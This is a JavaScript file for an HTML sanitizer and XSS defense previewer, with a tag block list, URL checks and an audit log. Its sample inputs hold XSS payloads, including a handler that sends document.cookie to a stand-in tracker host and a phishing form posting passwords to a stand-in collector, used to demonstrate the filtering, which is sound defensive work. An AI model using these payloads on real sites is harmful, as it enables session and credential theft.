// HTML Sanitizer & XSS Defense Previewer

const DANGEROUS_TAGS = new Set([
  'script', 'iframe', 'object', 'embed', 'applet', 'meta', 'link',
  'style', 'base', 'frame', 'frameset', 'noscript', 'template',
  'form', 'input', 'button', 'select', 'textarea', 'svg', 'math',
  'portal', 'dialog'
]);

const SAMPLE_PAYLOADS = {
  xss: `<h3>User Profile: Alex</h3>
<p>Hello! Welcome to my profile page.</p>
<!-- Script Tag Attack -->
<script>alert('XSS Exploit! Stealing session cookie: ' + document.cookie);</scr` + `ipt>
<p>Click here to claim your reward: <a href="javascript:alert('Stolen Token')">Free Gift Card</a></p>
<img src="invalid-image.jpg" onerror="alert('Image onerror attack executed!')" alt="Avatar">
<div onmouseover="fetch('https://evil-tracker.example/steal?c=' + document.cookie)">Hover over me to win prizes!</div>
<iframe src="https://phishing-site.example/login"></iframe>
<p>Legitimate comment text remains safe and legible.</p>`,

  phish: `<div class="account-warning">
  <h2>Security Alert: Confirm Your Password</h2>
  <form action="https://attacker-stealer.example/collect" method="POST">
    <p>Please enter your verification credentials below:</p>
    <label>Username: <input type="text" name="user" value="victim@domain.com"></label>
    <label>Current Password: <input type="password" name="pass"></label>
    <button type="submit" onclick="alert('Credentials sent to evil server!')">Confirm & Save</button>
  </form>
  <object data="malicious-payload.swf" type="application/x-shockwave-flash"></object>
  <embed src="rogue-media.mov">
</div>`,

  rich: `<article>
  <h1>The Future of Web Security</h1>
  <p>Building resilient web apps requires <strong>defense in depth</strong> and strict input sanitization.</p>
  <blockquote>"Sanitizing untrusted user markup before rendering prevents stored and reflected DOM attacks."</blockquote>
  <ul>
    <li>Always encode output HTML entities</li>
    <li>Use Content Security Policy (CSP) headers</li>
    <li>Employ robust whitelist-based sanitizers</li>
  </ul>
  <p>Learn more at <a href="https://owasp.org">OWASP Foundation</a>.</p>
  <table>
    <thead>
      <tr><th>Defense Mechanism</th><th>Protection Level</th></tr>
    </thead>
    <tbody>
      <tr><td>HTML Sanitizer</td><td>High</td></tr>
      <tr><td>Blacklisting RegEx</td><td>Fragile / Bypassed easily</td></tr>
    </tbody>
  </table>
</article>`
};

function isSafeUrl(url) {
  if (!url) return false;
  const trimmed = url.trim().toLowerCase();
  // Strip control chars
  const sanitized = trimmed.replace(/[\x00-\x20]/g, '');
  if (sanitized.startsWith('javascript:') || sanitized.startsWith('vbscript:') || sanitized.startsWith('data:text/html')) {
    return false;
  }
  // Allow safe protocols or relative URLs
  return /^(https?:|mailto:|tel:|#|\/|\.\/|\.\.\/)/.test(sanitized) || /^data:image\/(png|jpeg|jpg|gif|webp);base64,/i.test(sanitized);
}

function buildWhitelist(options) {
  const allowed = new Set();
  
  if (options.allowText) {
    ['p', 'br', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'span'].forEach(t => allowed.add(t));
  }
  if (options.allowFormatting) {
    ['b', 'i', 'strong', 'em', 'u', 's', 'strike', 'del', 'ins', 'code', 'pre', 'blockquote', 'hr', 'ul', 'ol', 'li', 'mark', 'small', 'sub', 'sup'].forEach(t => allowed.add(t));
  }
  if (options.allowLinks) {
    allowed.add('a');
  }
  if (options.allowImages) {
    allowed.add('img');
  }
  if (options.allowTables) {
    ['table', 'thead', 'tbody', 'tfoot', 'tr', 'th', 'td', 'caption', 'colgroup', 'col'].forEach(t => allowed.add(t));
  }
  
  return allowed;
}

function sanitizeHtmlString(inputHtml, options) {
  const audit = {
    tagsRemoved: [],
    attrsStripped: [],
    urisDefused: [],
    inputBytes: new Blob([inputHtml]).size,
    outputBytes: 0,
    elementCount: 0
  };

  if (!inputHtml || !inputHtml.trim()) {
    return { sanitizedHtml: '', audit };
  }

  const parser = new DOMParser();
  const doc = parser.parseFromString(inputHtml, 'text/html');
  const allowedTags = buildWhitelist(options);

  // Recursive tree sanitizer
  function cleanNode(node) {
    if (!node) return;

    // NodeFilter or child iteration
    const children = Array.from(node.childNodes);
    for (const child of children) {
      if (child.nodeType === Node.COMMENT_NODE) {
        // Strip comments to prevent conditional IE comments or exploit hiding
        child.remove();
        continue;
      }

      if (child.nodeType === Node.TEXT_NODE) {
        continue;
      }

      if (child.nodeType === Node.ELEMENT_NODE) {
        const tagName = child.tagName.toLowerCase();

        // 1. Dangerous blacklisted tags: Remove element AND its descendants
        if (DANGEROUS_TAGS.has(tagName)) {
          audit.tagsRemoved.push(`Blocked dangerous <${tagName}> tag`);
          child.remove();
          continue;
        }

        // 2. Unwhitelisted tags: Unwrap or drop
        if (!allowedTags.has(tagName)) {
          audit.tagsRemoved.push(`Disallowed tag <${tagName}> removed (text preserved)`);
          // Replace tag with its children
          while (child.firstChild) {
            child.parentNode.insertBefore(child.firstChild, child);
          }
          child.remove();
          continue;
        }

        audit.elementCount++;

        // 3. Clean and sanitize element attributes
        const attributes = Array.from(child.attributes);
        for (const attr of attributes) {
          const attrName = attr.name.toLowerCase();
          const attrVal = attr.value;

          // Event handlers (on*)
          if (attrName.startsWith('on')) {
            audit.attrsStripped.push(`Removed inline handler ${attrName} from <${tagName}>`);
            child.removeAttribute(attr.name);
            continue;
          }

          // URLs (href, src, cite, action)
          if (['href', 'src', 'cite'].includes(attrName)) {
            if (!isSafeUrl(attrVal)) {
              audit.urisDefused.push(`Defused unsafe URI in ${attrName} of <${tagName}>: ${attrVal.substring(0, 35)}...`);
              child.removeAttribute(attr.name);
              continue;
            }
          }

          // Whitelist safe attributes per tag
          const isGenericSafe = ['title', 'class', 'id', 'alt', 'width', 'height'].includes(attrName);
          const isLinkSafe = tagName === 'a' && ['href', 'target', 'rel'].includes(attrName);
          const isImgSafe = tagName === 'img' && ['src', 'alt', 'loading'].includes(attrName);
          const isTableSafe = ['td', 'th'].includes(tagName) && ['colspan', 'rowspan', 'scope'].includes(attrName);

          if (!isGenericSafe && !isLinkSafe && !isImgSafe && !isTableSafe) {
            audit.attrsStripped.push(`Stripped non-whitelisted attr '${attrName}' from <${tagName}>`);
            child.removeAttribute(attr.name);
            continue;
          }
        }

        // 4. Hardening external links if requested
        if (tagName === 'a' && options.enforceNoopener) {
          child.setAttribute('rel', 'noopener noreferrer');
          child.setAttribute('target', '_blank');
        }

        // Recursively clean children
        cleanNode(child);
      }
    }
  }

  cleanNode(doc.body);

  const sanitized = doc.body.innerHTML;
  audit.outputBytes = new Blob([sanitized]).size;

  return {
    sanitizedHtml: sanitized,
    audit
  };
}

document.addEventListener('DOMContentLoaded', () => {
  const rawInput = document.getElementById('raw-html-input');
  const sanitizedOutput = document.getElementById('sanitized-html-output');
  const sanitizeBtn = document.getElementById('sanitize-btn');
  const clearBtn = document.getElementById('clear-input-btn');
  const copyBtn = document.getElementById('copy-sanitized-btn');
  const copyBtn2 = document.getElementById('copy-sanitized-btn2');

  // Whitelist Checkboxes
  const allowText = document.getElementById('allow-text');
  const allowFormatting = document.getElementById('allow-formatting');
  const allowLinks = document.getElementById('allow-links');
  const allowImages = document.getElementById('allow-images');
  const allowTables = document.getElementById('allow-tables');
  const enforceNoopener = document.getElementById('enforce-noopener');

  // Stats
  const statTagsRemoved = document.getElementById('stat-tags-removed');
  const statAttrsStripped = document.getElementById('stat-attrs-stripped');
  const statUrisDefused = document.getElementById('stat-uris-defused');
  const statCharsDiff = document.getElementById('stat-chars-diff');
  const previewTagCount = document.getElementById('preview-tag-count');

  // Tabs & Views
  const tabCodeBtn = document.getElementById('tab-code-btn');
  const tabPreviewBtn = document.getElementById('tab-preview-btn');
  const tabAuditBtn = document.getElementById('tab-audit-btn');
  const viewCode = document.getElementById('view-code');
  const viewPreview = document.getElementById('view-preview');
  const viewAudit = document.getElementById('view-audit');
  const previewIframe = document.getElementById('preview-iframe');
  const auditLogContainer = document.getElementById('audit-log-container');

  // Preset Samples
  const sampleXssBtn = document.getElementById('sample-xss-btn');
  const samplePhishBtn = document.getElementById('sample-phish-btn');
  const sampleRichBtn = document.getElementById('sample-rich-btn');

  function getOptions() {
    return {
      allowText: allowText ? allowText.checked : true,
      allowFormatting: allowFormatting ? allowFormatting.checked : true,
      allowLinks: allowLinks ? allowLinks.checked : true,
      allowImages: allowImages ? allowImages.checked : true,
      allowTables: allowTables ? allowTables.checked : true,
      enforceNoopener: enforceNoopener ? enforceNoopener.checked : true
    };
  }

  function runSanitization() {
    const rawVal = rawInput.value;
    const { sanitizedHtml, audit } = sanitizeHtmlString(rawVal, getOptions());

    sanitizedOutput.value = sanitizedHtml;

    // Update Stats
    statTagsRemoved.textContent = audit.tagsRemoved.length;
    statAttrsStripped.textContent = audit.attrsStripped.length;
    statUrisDefused.textContent = audit.urisDefused.length;
    statCharsDiff.textContent = `${audit.inputBytes} / ${audit.outputBytes} B`;
    if (previewTagCount) {
      previewTagCount.textContent = `${audit.elementCount} elements retained`;
    }

    // Render Preview in Sandboxed Iframe
    renderSandboxedPreview(sanitizedHtml);

    // Render Audit Log
    renderAuditLog(audit);
  }

  function renderSandboxedPreview(htmlContent) {
    if (!previewIframe) return;
    const styledHtml = `
      <!DOCTYPE html>
      <html>
        <head>
          <meta charset="UTF-8">
          <style>
            body {
              font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
              padding: 1.25rem;
              margin: 0;
              color: #1f2937;
              background: #ffffff;
              line-height: 1.6;
              font-size: 14px;
            }
            a { color: #2563eb; text-decoration: underline; }
            table { border-collapse: collapse; width: 100%; margin: 1rem 0; }
            th, td { border: 1px solid #d1d5db; padding: 6px 10px; text-align: left; }
            th { background: #f3f4f6; }
            blockquote { border-left: 3px solid #3b82f6; margin: 0; padding-left: 1rem; color: #4b5563; }
            code { background: #f3f4f6; padding: 2px 5px; border-radius: 4px; font-family: monospace; }
            img { max-width: 100%; height: auto; border-radius: 6px; }
          </style>
        </head>
        <body>
          ${htmlContent || '<p style="color: #9ca3af; font-style: italic;">No sanitized content to preview.</p>'}
        </body>
      </html>
    `;
    previewIframe.srcdoc = styledHtml;
  }

  function renderAuditLog(audit) {
    if (!auditLogContainer) return;
    const logs = [];

    audit.tagsRemoved.forEach(msg => {
      logs.push(`<div class="log-item stripped">⚠️ ${escapeHtml(msg)}</div>`);
    });
    audit.attrsStripped.forEach(msg => {
      logs.push(`<div class="log-item stripped">🛡️ ${escapeHtml(msg)}</div>`);
    });
    audit.urisDefused.forEach(msg => {
      logs.push(`<div class="log-item stripped">🚫 ${escapeHtml(msg)}</div>`);
    });

    if (logs.length === 0) {
      if (rawInput.value.trim()) {
        auditLogContainer.innerHTML = '<div class="log-item info" style="color: var(--success);">✓ Pristine markup. No dangerous tags, event handlers, or protocol triggers detected.</div>';
      } else {
        auditLogContainer.innerHTML = '<div class="log-item info">No markup analyzed yet.</div>';
      }
    } else {
      auditLogContainer.innerHTML = logs.join('');
    }
  }

  function escapeHtml(str) {
    return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
  }

  function switchTab(activeView) {
    tabCodeBtn.classList.toggle('active', activeView === 'code');
    tabPreviewBtn.classList.toggle('active', activeView === 'preview');
    tabAuditBtn.classList.toggle('active', activeView === 'audit');

    viewCode.style.display = activeView === 'code' ? 'flex' : 'none';
    viewPreview.style.display = activeView === 'preview' ? 'flex' : 'none';
    viewAudit.style.display = activeView === 'audit' ? 'flex' : 'none';
  }

  // Event Listeners
  rawInput.addEventListener('input', runSanitization);

  [allowText, allowFormatting, allowLinks, allowImages, allowTables, enforceNoopener].forEach(cb => {
    if (cb) cb.addEventListener('change', runSanitization);
  });

  sanitizeBtn.addEventListener('click', runSanitization);

  clearBtn.addEventListener('click', () => {
    rawInput.value = '';
    sanitizedOutput.value = '';
    runSanitization();
    rawInput.focus();
  });

  tabCodeBtn.addEventListener('click', () => switchTab('code'));
  tabPreviewBtn.addEventListener('click', () => switchTab('preview'));
  tabAuditBtn.addEventListener('click', () => switchTab('audit'));

  // Copy Buttons
  function handleCopy(btn) {
    if (!sanitizedOutput.value) return;
    navigator.clipboard.writeText(sanitizedOutput.value).then(() => {
      const orig = btn.textContent;
      btn.textContent = 'Copied!';
      btn.classList.add('copied');
      setTimeout(() => {
        btn.textContent = orig;
        btn.classList.remove('copied');
      }, 1800);
    }).catch(err => console.error('Copy failed', err));
  }

  if (copyBtn) copyBtn.addEventListener('click', () => handleCopy(copyBtn));
  if (copyBtn2) copyBtn2.addEventListener('click', () => handleCopy(copyBtn2));

  // Sample buttons
  sampleXssBtn.addEventListener('click', () => {
    rawInput.value = SAMPLE_PAYLOADS.xss;
    runSanitization();
  });

  samplePhishBtn.addEventListener('click', () => {
    rawInput.value = SAMPLE_PAYLOADS.phish;
    runSanitization();
  });

  sampleRichBtn.addEventListener('click', () => {
    rawInput.value = SAMPLE_PAYLOADS.rich;
    runSanitization();
  });

  // Initial demo load
  rawInput.value = SAMPLE_PAYLOADS.xss;
  runSanitization();
});